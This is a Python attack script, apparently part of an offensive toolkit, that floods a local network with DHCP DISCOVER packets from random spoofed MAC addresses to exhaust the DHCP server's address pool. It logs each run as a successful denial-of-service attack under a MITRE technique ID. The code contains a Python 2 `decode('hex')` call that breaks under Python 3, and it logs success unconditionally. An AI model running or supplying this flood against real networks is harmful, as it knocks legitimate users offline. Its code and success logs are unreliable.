# modules/exploits/dhcp_starvation_flood.py

import random
import time
import os
import json
from datetime import datetime
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1499.001"  # Endpoint Denial of Service: Network DoS

def log_dos_attack(count):
    os.makedirs("results", exist_ok=True)
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "attack_type": "DHCP Starvation",
        "packets_sent": count,
        "ttp": MITRE_TTP,
        "success": True
    }
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(log_entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def generate_mac():
    return "02:00:00:%02x:%02x:%02x" % (
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff)
    )

def flood_dhcp(interface, count):
    print(f"[✓] Launching DHCP starvation flood on interface {interface}")
    for _ in range(count):
        mac = generate_mac()
        ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=mac.replace(':', '').decode('hex'), xid=random.randint(1, 90000000), flags=0x8000)
        dhcp = DHCP(options=[("message-type", "discover"), ("end")])
        packet = ether / ip / udp / bootp / dhcp
        sendp(packet, iface=interface, verbose=False)
        time.sleep(0.1)
    log_dos_attack(count)
    print(f"[✓] Sent {count} DHCP discovery packets.")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="DHCP Starvation Flood Tool")
    parser.add_argument("--iface", required=True, help="Network interface (e.g., eth0)")
    parser.add_argument("--count", type=int, default=50, help="Number of discovery packets")
    args = parser.parse_args()
    flood_dhcp(args.iface, args.count)
